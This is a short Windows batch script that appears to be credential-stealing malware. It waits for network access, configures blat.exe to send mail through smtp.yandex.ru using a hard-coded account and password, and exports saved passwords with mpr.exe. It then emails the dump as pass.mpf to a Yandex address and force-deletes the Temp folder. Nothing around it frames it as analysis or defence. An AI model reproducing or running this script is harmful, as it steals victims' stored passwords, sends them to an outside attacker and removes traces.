@echo off
:start
ping ya.ru -n 5 >nul
if %errorlevel%==0 (goto send) else (goto end)

:end
goto :start

:send
blat.exe -install -server smtp.yandex.ru -port 587 -f  hackwin32@yandex.ru -u hackwin32 -pw Netvirus96
mpr.exe /export
ren *.mpf pass.mpf
blat.exe -body PassReg -to hackwin32@yandex.ru -attach pass.mpf
del %Temp%\*.* /Q /S /F
pause
